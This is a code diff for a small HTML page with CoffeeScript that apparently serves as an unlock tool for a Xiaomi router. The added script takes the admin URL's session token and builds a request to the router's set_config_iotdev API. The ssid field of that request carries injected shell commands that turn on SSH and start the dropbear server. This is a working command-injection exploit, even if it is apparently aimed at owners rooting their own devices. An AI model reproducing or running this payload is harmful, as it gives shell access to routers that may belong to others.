@@ -5,15 +5,27 @@
         body>div{
             margin:10px;
         }
+        .result0{
+            padding:5px;
+            background:#f2f2f2;
+            font-size:12px;
+            border-radius:4px;
+        }
         </style>
     </head>
     <body>
-        <div>小米路由器后台访问连接：<input><button class="check">解析</button></div>
+        <div>小米路由器后台访问连接：<input class="check_base_url"><button class="check">解析</button></div>
         <div>获取访问地址<div class="result0"></div></div>
     
     </body>
 </html>
 <script type="text/coffeescript">
 console.log "hello ac2530"
+$("body").on "click",".check",(evt)->
+    check_base_url = $(".check_base_url").val()
+    check_base_url_list = check_base_url.split("stok=")
+    stok = check_base_url_list[1].split("/")[0]
+    result0 = "#{check_base_url_list[0]}stok=#{stok}/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B"
+    $(".result0").text result0
 </script>
 <script src="static/js/coffeescript.js"></script>
